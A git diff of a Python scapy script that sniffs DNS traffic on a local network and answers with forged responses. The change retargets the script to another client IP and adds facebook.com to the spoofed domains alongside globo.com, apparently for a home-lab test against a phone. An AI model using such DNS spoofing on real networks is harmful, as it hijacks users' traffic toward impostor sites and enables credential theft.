@@ -60,7 +60,7 @@ def handle_packet_fn(iface, spoof_ip, spoof_domains):
                 )
 
             #print("Resolved DNS request for %s to %s for %s" %
-             #       (queried_host, resolved_ip, ip.src))
+            #        (queried_host, resolved_ip, ip.src))
 
             # Use scapy to send our response back to your phone.
             send(dns_response, iface=iface)
@@ -96,9 +96,9 @@ def run(iface, local_ip, sniff_filter, spoof_domains):
 IFACE= 'eth0'
 local_ip = _get_local_ip(IFACE)
 # The local IP of second machine
-client_ip = '192.168.0.121'
+client_ip = '192.168.0.123'
 
-SPOOF_DOMAINS = ['globo.com', 'www.globo.com']
+SPOOF_DOMAINS = ['facebook.com', 'www.facebook.com', 'globo.com','www.globo.com']
 SNIFF_FILTER = ("udp port 53") # && dst %s && src %s" %(local_ip, client_ip)
 
 run(IFACE, local_ip, SNIFF_FILTER, SPOOF_DOMAINS)
